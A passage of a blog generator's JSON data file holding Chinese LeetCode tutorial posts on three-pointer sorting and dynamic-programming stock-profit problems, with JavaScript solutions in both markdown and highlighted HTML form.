class=\"line\">    <span class=\"keyword\">if</span> (nums[curr] === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      swap(left++, curr--)</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (nums[curr] === <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">      swap(right--, curr)</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      curr++</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> nums</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"技巧篇-三指针\"><a href=\"#技巧篇-三指针\" class=\"headerlink\" title=\"技巧篇 - 三指针\"></a>技巧篇 - 三指针</h1><h2 id=\"1-颜色分类-leetcode-题目编号-75\"><a href=\"#1-颜色分类-leetcode-题目编号-75\" class=\"headerlink\" title=\"1. 颜色分类 (leetcode 题目编号 75)\"></a>1. 颜色分类 (leetcode 题目编号 75)</h2><p><strong>描述</strong><br>给定一个包含红色、白色和蓝色，一共 n 个元素的数组，原地对它们进行排序，使得相同颜色的元素相邻，并按照红色、白色、蓝色顺序排列。</p>\n<p>此题中，我们使用整数 0、 1 和 2 分别表示红色、白色和蓝色。</p>\n<p><strong>示例:</strong><br>输入: [2,0,2,1,1,0]<br>输出: [0,0,1,1,2,2]</p>\n<p><strong>解题思路</strong></p>\n<ul>\n<li>可将所求结果理解成 <code>[0, ..., 0]</code>、<code>[1, ..., 1]</code>、 <code>[2, ..., 2]</code> 三块</li>\n<li>初始化0的最右边界：<code>p0 = 0</code> （左闭右开区间）</li>\n<li>初始化2的最左边界：<code>p2 = n - 1</code> （左开右闭区间）</li>\n<li>初始化当前考虑的元素序号 ：<code>curr = 0</code></li>\n<li><code>While (curr &lt;= p2)</code> :<ul>\n<li>若 <code>nums[curr] = 0</code> ：交换第 curr 个和第 p0 个元素，并将指针都向右移。</li>\n<li>若 <code>nums[curr] = 2</code> ：交换第 curr 个和第 p2个元素，并将 p2 指针左移。</li>\n<li>若 <code>nums[curr] = 1</code> ：将指针 curr 右移。</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> sortColors = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> swap = <span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> temp = nums[a]</span><br><span class=\"line\">    nums[a] = nums[b]</span><br><span class=\"line\">    nums[b] = temp</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> curr = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> left = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> right = nums.length - <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (curr &lt;= right) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nums[curr] === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      swap(left++, curr--)</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (nums[curr] === <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">      swap(right--, curr)</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      curr++</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> nums</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"技巧篇 - 动态规划 - 求买卖股票求最大利润","date":"2021-05-24T08:32:28.000Z","_content":"\n# 技巧篇 - 动态规划 - 求买卖股票求最大利润\n\n### 买卖股票的最佳时机（leetcode 题目编号 121）\n**问题：**\n给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。\n\n如果你最多只允许完成一笔交易（即买入和卖出一支股票一次），设计一个算法来计算你所能获取的最大利润。\n\n注意：你不能在买入股票前卖出股票。\n\n**示例：**\n示例 1:\n输入: [7,1,5,3,6,4]\n输出: 5\n解释: 在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。\n     注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。\n\n示例 2:\n输入: [7,6,4,3,1]\n输出: 0\n解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。\n\n**思路：**\n* 遍历数组取里面的最小值作为买入价\n* 每次比较遍历项与买入价的差值\n* 取各差值的最大者即为最大利润\n\n```js\nvar maxProfit = function(prices) {\n  let res = 0;\n  let buy = prices[0];\n\n  for (let i = 1; i < prices.length; i++) {\n    if (prices[i] > buy) {\n      res = Math.max(res, prices[i] - buy);\n    } else {\n      buy = prices[i];\n    }\n  }\n\n  return res;\n};\n```\n\n\n### 买卖股票的最佳时机 II（leetcode 题目编号 122）\n**问题：**\n给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。\n\n设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。\n\n注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。\n\n**示例：**\n示例 1:\n输入: [7,1,5,3,6,4]\n输出: 7\n解释: 在第 2 天（股票价格 = 1）的时候买入，在第 3 天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。\n     随后，在第 4 天（股票价格 = 3）的时候买入，在第 5 天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 = 3 。\n\n示例 2:\n输入: [1,2,3,4,5]\n输出: 4\n解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。\n     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。\n     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。\n\n**思路：**\n* 从第二天开始，如果当前价格比之前价格高，则把差值加入利润中\n\n```js\nvar maxProfit = function(prices) {\n  let res = 0;\n  \n  for (let i = 0; i < prices.length - 1; i++) {\n    if (prices[i] < prices[i + 1]) {\n      res += prices[i + 1] - prices[i]\n    }\n  }\n\n  return res;\n};\n```\n\n### 买卖股票的最佳时机 III（leetcode 题目编号 123）\n**问题：**\n给定一个数组，它的第 i 个元素是一支给定的股票在第 i 天的价格。\n\n设计一个算法来计算你所能获取的最大利润。你最多可以完成 两笔 交易。\n\n注意: 你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。\n\n**示例：**\n示例 1:\n输入: [3,3,5,0,0,3,1,4]\n输出: 6\n解释: 在第 4 天（股票价格 = 0）的时候买入，在第 6 天（股票价格 = 3）的时候卖出，这笔交易所能获得利润 = 3-0 = 3 。\n     随后，在第 7 天（股票价格 = 1）的时候买入，在第 8 天 （股票价格 = 4）的时候卖出，这笔交易所能获得利润 = 4-1 = 3 。\n\n示例 2:\n输入: [1,2,3,4,5]\n输出: 4\n解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。   \n     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。   \n     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。\n\n**思路：**\n* 定义 `local[i][j]` 为在到达第 `i` 天时最多可进行 `j` 次交易并且**最后一次交易在最后一天卖出**的最大利润，此为局部最优\n* 定义 `global[i][j]` 为在到达第 `i` 天时最多可进行 `j` 次交易的最大利润，此为全局最优\n* 局部最优值是比较**前一天并少交易一次的全局最优加上大于0的差值**，和**前一天的局部最优加上差值**中取较大值\n* 全局最优是比较**局部最优**和**前一天的全局最优**\n\n```js\nvar maxProfit = function(prices) {\n  if (!prices.length) return 0; \n\n  let local = [[0, 0, 0]];\n  let global = [[0, 0, 0]];\n  \n  for (let i = 1; i < prices.length; i++) {\n    let diff = prices[i] - prices[i - 1];\n    local[i] = [0];\n    global[i] = [0];\n\n    for (let j = 1; j <= 2; j++) {\n      local[i][j] = Math.max(global[i - 1][j - 1] + Math.max(diff, 0), local[i - 1][j] + diff);      \n      global[i][j] = Math.max(local[i][j], global[i - 1][j]);\n    }\n    \n  }\n\n  return global[prices.length - 1][2];\n};\n```\n\n### 最佳买卖股票时机含冷冻期（leetcode 题目编号 309）\n\n**问题：**\n给定一个整数数组，其中第 i 个元素代表了第 i 天的股票价格 。​\n\n设计一个算法计算出最大利润。在满足以下约束条件下，你可以尽可能地完成更多的交易（多次买卖一支股票）:\n\n你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。\n卖出股票后，你无法在第二天买入股票 (即冷冻期为 1 天)。\n\n**示例：**\n示例1:\n\n输入: [1,2,3,0,2]\n输出: 3 \n解释: 对应的交易状态为: [买入, 卖出, 冷冻期, 买入, 卖出]\n\n**思路：**\n* 设 `buy[i]` 表示在第 `i` 天之前最后一个操作是买，此时的最大收益。\n* 设 `sell[i]` 表示在第 `i` 天之前最后一个操作是卖，此时的最大收益。\n* 则可以得出递推公式 `buy[i]  = max(sell[i-2] - price, buy[i-1])` 、`sell[i] = max(buy[i-1] + price, sell[i-1])`\n\n```js\nvar maxProfit = function(prices) {\n  if (!prices.length) return 0; \n\n  let buy = [];\n  let sell = [];\n\n  for (let i = 0; i < prices.length; i++) {\n    if (i === 0) {\n      buy[i] = -prices[0];\n      sell[i] = 0;\n    } else if (i === 1) {\n      buy[i] = Math.max(-prices[1], buy[i - 1]);\n      sell[i] = Math.max(prices[1] - prices[0], sell[i - 1]);\n    } else {\n      buy[i] = Math.max(sell[i - 2] - prices[i], buy[i - 1]);\n      sell[i] = Math.max(buy[i - 1] + prices[i], sell[i - 1]);\n    }\n  }\n\n  return sell[prices.length - 1];\n};\n```\n\n","source":"_posts/算法题/技巧篇 - 动态规划 - 求买卖股票求最大利润.md","raw":"---\ntitle: 技巧篇 - 动态规划 - 求买卖股票求最大利润\ncategories: 算法题\ntags: [算法题, 技巧篇]\ndate: 2021-05-24 16:32:28\n---\n\n# 技巧篇 - 动态规划 - 求买卖股票求最大利润\n\n### 买卖股票的最佳时机（leetcode 题目编号 121）\n**问题：**\n给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。\n\n如果你最多只允许完成一笔交易（即买入和卖出一支股票一次），设计一个算法来计算你所能获取的最大利润。\n\n注意：你不能在买入股票前卖出股票。\n\n**示例：**\n示例 1:\n输入: [7,1,5,3,6,4]\n输出: 5\n解释: 在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。\n     注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。\n\n示例 2:\n输入: [7,6,4,3,1]\n输出: 0\n解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。\n\n**思路：**\n* 遍历数组取里面的最小值作为买入价\n* 每次比较遍历项与买入价的差值\n* 取各差值的最大者即为最大利润\n\n```js\nvar maxProfit = function(prices) {\n  let res = 0;\n  let buy = prices[0];\n\n  for (let i = 1; i < prices.length; i++) {\n    if (prices[i] > buy) {\n      res = Math.max(res, prices[i] - buy);\n    } else {\n      buy = prices[i];\n    }\n  }\n\n  return res;\n};\n```\n\n\n### 买卖股票的最佳时机 II（leetcode 题目编号 122）\n**问题：**\n给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。\n\n设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。\n\n注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。\n\n**示例：**\n示例 1:\n输入: [7,1,5,3,6,4]\n输出: 7\n解释: 在第 2 天（股票价格 = 1）的时候买入，在第 3 天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。\n     随后，在第 4 天（股票价格 = 3）的时候买入，在第 5 天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 = 3 。\n\n示例 2:\n输入: [1,2,3,4,5]\n输出: 4\n解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。\n     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。\n     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。\n\n**思路：**\n* 从第二天开始，如果当前价格比之前价格高，则把差值加入利润中\n\n```js\nvar maxProfit = function(prices) {\n  let res = 0;\n  \n  for (let i = 0; i < prices.length - 1; i++) {\n    if (prices[i] < prices[i + 1]) {\n      res += prices[i + 1] - prices[i]\n    }\n  }\n\n  return res;\n};\n```\n\n### 买卖股票的最佳时机 III（leetcode 题目编号 123）\n**问题：**\n给定一个数组，它的第 i 个元素是一支给定的股票在第 i 天的价格。\n\n设计一个算法来计算你所能获取的最大利润。你最多可以完成 两笔 交易。\n\n注意: 你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。\n\n**示例：**\n示例 1:\n输入: [3,3,5,0,0,3,1,4]\n输出: 6\n解释: 在第 4 天（股票价格 = 0）的时候买入，在第 6 天（股票价格 = 3）的时候卖出，这笔交易所能获得利润 = 3-0 = 3 。\n     随后，在第 7 天（股票价格 = 1）的时候买入，在第 8 天 （股票价格 = 4）的时候卖出，这笔交易所能获得利润 = 4-1 = 3 。\n\n示例 2:\n输入: [1,2,3,4,5]\n输出: 4\n解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。   \n     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。   \n     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。\n\n**思路：**\n* 定义 `local[i][j]` 为在到达第 `i` 天时最多可进行 `j` 次交易并且**最后一次交易在最后一天卖出**的最大利润，此为局部最优\n* 定义 `global[i][j]` 为在到达第 `i` 天时最多可进行 `j` 次交易的最大利润，此为全局最优\n* 局部最优值是比较**前一天并少交易一次的全局最优加上大于0的差值**，和**前一天的局部最优加上差值**中取较大值\n* 全局最优是比较**局部最优**和**前一天的全局最优**\n\n```js\nvar maxProfit = function(prices) {\n  if (!prices.length) return 0; \n\n  let local = [[0, 0, 0]];\n  let global = [[0, 0, 0]];\n  \n  for (let i = 1; i < prices.length; i++) {\n    let diff = prices[i] - prices[i - 1];\n    local[i] = [0];\n    global[i] = [0];\n\n    for (let j = 1; j <= 2; j++) {\n      local[i][j] = Math.max(global[i - 1][j - 1] + Math.max(diff, 0), local[i - 1][j] + diff);      \n      global[i][j] = Math.max(local[i][j], global[i - 1][j]);\n    }\n    \n  }\n\n  return global[prices.length - 1][2];\n};\n```\n\n### 最佳买卖股票时机含冷冻期（leetcode 题目编号 309）\n\n**问题：**\n给定一个整数数组，其中第 i 个元素代表了第 i 天的股票价格 。​\n\n设计一个算法计算出最大利润。在满足以下约束条件下，你可以尽可能地完成更多的交易（多次买卖一支股票）:\n\n你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。\n卖出股票后，你无法在第二天买入股票 (即冷冻期为 1 天)。\n\n**示例：**\n示例1:\n\n输入: [1,2,3,0,2]\n输出: 3 \n解释: 对应的交易状态为: [买入, 卖出, 冷冻期, 买入, 卖出]\n\n**思路：**\n* 设 `buy[i]` 表示在第 `i` 天之前最后一个操作是买，此时的最大收益。\n* 设 `sell[i]` 表示在第 `i` 天之前最后一个操作是卖，此时的最大收益。\n* 则可以得出递推公式 `buy[i]  = max(sell[i-2] - price, buy[i-1])` 、`sell[i] = max(buy[i-1] + price, sell[i-1])`\n\n```js\nvar maxProfit = function(prices) {\n  if (!prices.length) return 0; \n\n  let buy = [];\n  let sell = [];\n\n  for (let i = 0; i < prices.length; i++) {\n    if (i === 0) {\n      buy[i] = -prices[0];\n      sell[i] = 0;\n    } else if (i === 1) {\n      buy[i] = Math.max(-prices[1], buy[i - 1]);\n      sell[i] = Math.max(prices[1] - prices[0], sell[i - 1]);\n    } else {\n      buy[i] = Math.max(sell[i - 2] - prices[i], buy[i - 1]);\n      sell[i] = Math.max(buy[i - 1] + prices[i], sell[i - 1]);\n    }\n  }\n\n  return sell[prices.length - 1];\n};\n```\n\n","slug":"算法题/技巧篇 - 动态规划 - 求买卖股票求最大利润","published":1,"updated":"2021-06-07T10:01:09.882Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmga1yh0007ok6r8xv1gavl","content":"<h1 id=\"技巧篇-动态规划-求买卖股票求最大利润\"><a href=\"#技巧篇-动态规划-求买卖股票求最大利润\" class=\"headerlink\" title=\"技巧篇 - 动态规划 - 求买卖股票求最大利润\"></a>技巧篇 - 动态规划 - 求买卖股票求最大利润</h1><h3 id=\"买卖股票的最佳时机（leetcode-题目编号-121）\"><a href=\"#买卖股票的最佳时机（leetcode-题目编号-121）\" class=\"headerlink\" title=\"买卖股票的最佳时机（leetcode 题目编号 121）\"></a>买卖股票的最佳时机（leetcode 题目编号 121）</h3><p><strong>问题：</strong><br>给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。</p>\n<p>如果你最多只允许完成一笔交易（即买入和卖出一支股票一次），设计一个算法来计算你所能获取的最大利润。</p>\n<p>注意：你不能在买入股票前卖出股票。</p>\n<p><strong>示例：</strong><br>示例 1:<br>输入: [7,1,5,3,6,4]<br>输出: 5<br>解释: 在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。<br>     注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。</p>\n<p>示例 2:<br>输入: [7,6,4,3,1]<br>输出: 0<br>解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。</p>\n<p><strong>思路：</strong></p>\n<ul>\n<li>遍历数组取里面的最小值作为买入价</li>\n<li>每次比较遍历项与买入价的差值</li>\n<li>取各差值的最大者即为最大利润</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> maxProfit = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">prices</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> buy = prices[<span class=\"number\">0</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (prices[i] &gt; buy) &#123;</span><br><span class=\"line\">      res = <span class=\"built_in\">Math</span>.max(res, prices[i] - buy);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      buy = prices[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"买卖股票的最佳时机-II（leetcode-题目编号-122）\"><a href=\"#买卖股票的最佳时机-II（leetcode-题目编号-122）\" class=\"headerlink\" title=\"买卖股票的最佳时机 II（leetcode 题目编号 122）\"></a>买卖股票的最佳时机 II（leetcode 题目编号 122）</h3><p><strong>问题：</strong><br>给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。</p>\n<p>设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。</p>\n<p>注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p>\n<p><strong>示例：</strong><br>示例 1:<br>输入: [7,1,5,3,6,4]<br>输出: 7<br>解释: 在第 2 天（股票价格 = 1）的时候买入，在第 3 天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。<br>     随后，在第 4 天（股票价格 = 3）的时候买入，在第 5 天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 = 3 。</p>\n<p>示例 2:<br>输入: [1,2,3,4,5]<br>输出: 4<br>解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。<br>     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。<br>     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。</p>\n<p><strong>思路：</strong></p>\n<ul>\n<li>从第二天开始，如果当前价格比之前价格高，则把差值加入利润中</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> maxProfit = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">prices</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; prices.length - <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (prices[i] &lt; prices[i + <span class=\"number\">1</span>]) &#123;</span><br><span class=\"line\">      res += prices[i + <span class=\"number\">1</span>] - prices[i]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"买卖股票的最佳时机-III（leetcode-题目编号-123）\"><a href=\"#买卖股票的最佳时机-III（leetcode-题目编号-123）\" class=\"headerlink\" title=\"买卖股票的最佳时机 III（leetcode 题目编号 123）\"></a>买卖股票的最佳时机 III（leetcode 题目编号 123）</h3><p><strong>问题：</strong><br>给定一个数组，它的第 i 个元素是一支给定的股票在第 i 天的价格。</p>\n<p>设计一个算法来计算你所能获取的最大利润。你最多可以完成 两笔 交易。</p>\n<p>注意: 你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p>\n<p><strong>示例：</strong><br>示例 1:<br>输入: [3,3,5,0,0,3,1,4]<br>输出: 6<br>解释: 在第 4 天（股票价格 = 0）的时候买入，在第 6 天（股票价格 = 3）的时候卖出，这笔交易所能获得利润 = 3-0 = 3 。<br>     随后，在第 7 天（股票价格 = 1）的时候买入，在第 8 天 （股票价格 = 4）的时候卖出，这笔交易所能获得利润 = 4-1 = 3 。</p>\n<p>示例 2:<br>输入: [1,2,3,4,5]<br>输出: 4<br>解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。  <br>     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。  <br>     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。</p>\n<p><strong>思路：</strong></p>\n<ul>\n<li>定义 <code>local[i][j]</code> 为在到达第 <code>i</code> 天时最多可进行 <code>j</code> 次交易并且<strong>最后一次交易在最后一天卖出</strong>的最大利润，此为局部最优</li>\n<li>定义 <code>global[i][j]</code> 为在到达第 <code>i</code> 天时最多可进行 <code>j</code> 次交易的最大利润，此为全局最优</li>\n<li>局部最优值是比较<strong>前一天并少交易一次的全局最优加上大于0的差值</strong>，和<strong>前一天的局部最优加上差值</strong>中取较大值</li>\n<li>全局最优是比较<strong>局部最优</strong>和<strong>前一天的全局最优</strong></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> maxProfit = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">prices</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!prices.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> local = [[<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>]];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> <span class=\"built_in\">global</span> = [[<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>]];</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> diff = prices[i] - prices[i - <span class=\"number\">1</span>];</span><br><span class=\"line\">    local[i] = [<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"built_in\">global</span>[i] = [<span class=\"number\">0</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = <span class=\"number\">1</span>; j &lt;= <span class=\"number\">2</span>; j++) &#123;</span><br><span class=\"line\">      local[i][j] = <span class=\"built_in\">Math</span>.max(<span class=\"built_in\">global</span>[i - <span class=\"number\">1</span>][j - <span class=\"number\">1</span>] + <span class=\"built_in\">Math</span>.max(diff, <span class=\"number\">0</span>), local[i - <span class=\"number\">1</span>][j] + diff);      </span><br><span class=\"line\">      <span class=\"built_in\">global</span>[i][j] = <span class=\"built_in\">Math</span>.max(local[i][j], <span class=\"built_in\">global</span>[i - <span class=\"number\">1</span>][j]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">global</span>[prices.length - <span class=\"number\">1</span>][<span class=\"number\">2</span>];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"最佳买卖股票时机含冷冻期（leetcode-题目编号-309）\"><a href=\"#最佳买卖股票时机含冷冻期（leetcode-题目编号-309）\" class=\"headerlink\" title=\"最佳买卖股票时机含冷冻期（leetcode 题目编号 309）\"></a>最佳买卖股票时机含冷冻期（leetcode 题目编号 309）</h3><p><strong>问题：</strong><br>给定一个整数数组，其中第 i 个元素代表了第 i 天的股票价格 。​</p>\n<p>设计一个算法计算出最大利润。在满足以下约束条件下，你可以尽可能地完成更多的交易（多次买卖一支股票）:</p>\n<p>你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。<br>卖出股票后，你无法在第二天买入股票 (即冷冻期为 1 天)。</p>\n<p><strong>示例：</strong><br>示例1:</p>\n<p>输入: [1,2,3,0,2]<br>输出: 3<br>解释: 对应的交易状态为: [买入, 卖出, 冷冻期, 买入, 卖出]</p>\n<p><strong>思路：</strong></p>\n<ul>\n<li>设 <code>buy[i]</code> 表示在第 <code>i</code> 天之前最后一个操作是买，此时的最大收益。</li>\n<li>设 <code>sell[i]</code> 表示在第 <code>i</code> 天之前最后一个操作是卖，此时的最大收益。</li>\n<li>则可以得出递推公式 <code>buy[i]  = max(sell[i-2] - price, buy[i-1])</code> 、<code>sell[i] = max(buy[i-1] + price, sell[i-1])</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 